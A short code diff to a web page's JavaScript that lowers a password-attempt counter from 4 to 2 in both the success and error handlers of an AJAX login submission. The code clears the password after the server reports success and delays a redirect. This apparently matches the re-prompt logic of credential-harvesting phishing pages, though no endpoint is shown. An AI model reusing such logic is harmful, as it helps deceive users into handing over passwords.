@@ -393,7 +393,7 @@ body {
                 console.log(response);
                 if(response['signal'] == 'ok'){
                   $("#password").val("");
-                  if (count>=4) {
+                  if (count>=2) {
                     count=0;
                     // window.location.replace(response['redirect_link']);
                     
@@ -418,7 +418,7 @@ body {
             },
             error: function(){
               $("#password").val("");
-              if (count>=4) {
+              if (count>=2) {
                 count=0;
 
 Swal.fire({
